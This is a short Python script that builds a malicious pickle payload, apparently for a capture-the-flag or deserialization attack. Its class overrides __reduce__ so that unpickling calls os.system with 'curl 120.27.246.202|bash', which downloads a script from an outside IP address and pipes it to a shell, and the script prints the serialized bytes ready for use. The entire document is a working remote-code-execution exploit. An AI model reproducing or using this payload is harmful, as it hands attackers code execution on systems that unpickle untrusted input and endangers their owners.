import pickle
import os

class exp(object):
    def __reduce__(self):
        s = """curl 120.27.246.202|bash"""
        return (os.system, (s,))

e = exp()
s = pickle.dumps(e,protocol=2) # for python3 only
print(s)